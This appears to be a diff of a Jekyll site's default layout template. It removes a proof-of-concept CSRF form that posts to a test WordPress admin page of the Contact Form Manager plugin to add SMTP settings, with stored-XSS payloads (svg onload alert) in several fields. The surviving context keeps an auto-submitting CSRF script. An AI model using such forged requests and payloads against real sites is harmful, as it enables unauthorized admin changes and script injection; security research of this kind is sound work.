@@ -23,18 +23,6 @@ layout: default
     document.csrfForm.submit();
   </script>
   
-  <form id="f1" method="POST" action="http://wpdistillery.vm/wp-admin/admin.php?page=contact-form-manager-manage-smtp&action=add-smtp">
-     <table>
-        <tr><td>xyz_cfm_SmtpAuthentication<td><input name="xyz_cfm_SmtpAuthentication" value="true" size="100"></tr>
-        <tr><td>xyz_cfm_SmtpEmailAddress<td><input name="xyz_cfm_SmtpEmailAddress" value="<svg onload=alert(document.domain)>" size="100"></tr>
-        <tr><td>xyz_cfm_SmtpHostName<td><input name="xyz_cfm_SmtpHostName" value="<svg onload=alert(document.domain)>" size="100"></tr>
-        <tr><td>xyz_cfm_SmtpPassword<td><input name="xyz_cfm_SmtpPassword" value="<svg onload=alert(document.domain)>" size="100"></tr>
-        <tr><td>xyz_cfm_SmtpPortNumber<td><input name="xyz_cfm_SmtpPortNumber" value="25" size="100"></tr>
-        <tr><td>xyz_cfm_SmtpSecuirity<td><input name="xyz_cfm_SmtpSecuirity" value="notls" size="100"></tr>
-     </table>
-  </form>
-  <button onclick="document.getElementById('f1').submit()">Submit</button>
-  
   <ul class="post-list">
     {% for post in site.posts %}
       <li>
